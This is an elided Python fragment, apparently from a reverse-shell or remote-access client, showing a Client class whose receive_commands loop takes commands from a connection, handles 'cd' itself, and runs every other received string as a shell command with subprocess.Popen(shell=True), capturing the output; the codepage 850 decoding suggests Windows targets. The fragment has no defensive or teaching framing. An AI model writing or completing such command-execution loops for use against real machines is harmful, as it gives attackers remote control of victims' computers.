...
class Client(object):
    ...
    def receive_commands(self):
        ...
        while True:
            ...
            if data == b'':
                break
            elif data[:2].decode("850") == 'cd':
                directory = data[3:].decode("850")
                try:
                ...
                try:
                    cmd = subprocess.Popen(data[:].decode("850"), shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode("850", errors="replace")
                except Exception as e:
